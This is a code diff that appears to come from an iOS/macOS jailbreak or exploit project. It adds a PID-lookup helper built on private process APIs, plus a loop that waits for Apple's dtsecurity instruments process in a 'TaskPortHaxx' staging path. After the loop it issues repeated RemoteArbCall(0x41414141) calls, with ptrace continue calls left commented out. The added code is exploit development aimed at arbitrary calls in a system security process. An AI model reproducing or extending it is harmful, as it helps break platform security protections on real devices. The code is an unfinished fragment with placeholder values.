@@ -13,6 +13,31 @@
 #include "Header.h"
 #include <sys/wait.h>
 
+#define PT_CONTINUE     7       /* continue the child */
+#define PT_ATTACHEXC    14      /* attach to running process with signal exception */
+
+
+#define PROC_PIDPATHINFO_SIZE           (MAXPATHLEN)
+#define PROC_PIDPATHINFO_MAXSIZE        (4 * MAXPATHLEN)
+extern int proc_listallpids(void *, int);
+extern int proc_pidpath(int, void *, uint32_t);
+
+pid_t find_process_pid(const char* executePath) {
+    pid_t pids[4096];
+    int count = proc_listallpids(pids, sizeof(pids));
+    pid_t max_pid = 0;
+
+    for (int i = 0; i < count; i++) {
+        char path[PROC_PIDPATHINFO_MAXSIZE];
+        if (proc_pidpath(pids[i], path, sizeof(path)) > 0 &&
+            strstr(path, executePath)) {
+            if (pids[i] > max_pid)
+                max_pid = pids[i];
+        }
+    }
+    return max_pid;
+}
+
 NSDictionary *getLaunchdStringOffsets(void) {
     NSMutableDictionary *dict = [NSMutableDictionary dictionary];
     
@@ -198,6 +223,31 @@ NSDictionary *getLaunchdStringOffsets(void) {
         if (getpgid(self.childPid) <= 0) {
             launchTest(@"dtsecurity");
         }
+
+        pid_t dtsecurity_pid = 0;
+        while(1) {
+            dtsecurity_pid = find_process_pid("/var/db/com.apple.xpc.roleaccountd.staging/exec/TaskPortHaxx.xpc/com.apple.dt.instruments.dtsecurity");
+            if(dtsecurity_pid != 0) break;
+            usleep(100000);
+        }
+        printf("dtsecurity_pid = %d\n", dtsecurity_pid);
+        RemoteArbCall(0x41414141);
+        RemoteArbCall(0x41414141);
+        RemoteArbCall(0x41414141);
+        RemoteArbCall(0x41414141);
+        RemoteArbCall(0x41414141);
+        RemoteArbCall(0x41414141);
+        // ptrace(PT_CONTINUE, dtsecurity_pid, (void*)1, 0);
+        // RemoteArbCall(0x41414141);
+        // ptrace(PT_CONTINUE, dtsecurity_pid, (void*)1, 0);
+        // RemoteArbCall(0x41414141);
+        // ptrace(PT_CONTINUE, dtsecurity_pid, (void*)1, 0);
+        // RemoteArbCall(0x41414141);
+        // ptrace(PT_CONTINUE, dtsecurity_pid, (void*)1, 0);
+
+        
+
+
         
         kern_return_t kr;
         
